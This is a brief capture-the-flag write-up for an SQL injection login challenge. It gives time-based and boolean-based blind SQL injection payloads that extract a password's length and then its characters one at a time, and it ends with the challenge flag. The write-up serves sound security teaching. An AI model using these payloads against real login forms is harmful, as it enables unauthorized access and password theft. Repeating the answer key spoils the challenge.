# [SQL Injection Level 5](http://s1063.vdi.mipt.ru:8000/challenges#SQL%20Injection%20Level%205)
### [Login form](http://chall1.ctf.pwne.xyz:5555/level5/)

# Solution 1 (very noticeable)
1. Let's find the password length:
login: `admin' and (select if(length(password)=<N>,sleep(2),0)); #`, where N - guessed length.
After bruteforce we get password length **32**.
2. Only thing I came up with is to figure out every single character in the password:
login: `admin' and (select if(ASCII(lower(substring((password),<N>,1)))>90,sleep(2),0)); #`, where N - index.

# Solution 2 (more quite)
The same idea, but if condition is true we login, otherwise we don't:
1. Length:
login: `smth' or username=if(length(password)=<N>,'admin','smth') #`
2. Chars one by one:
login: `smth' or username=if(ASCII(lower(substring(password,<N>,1)))><N>,'admin','smth') #`

**Answer**: `flag{70cba351d59d3e2a60cd1eb201f1f7fa}`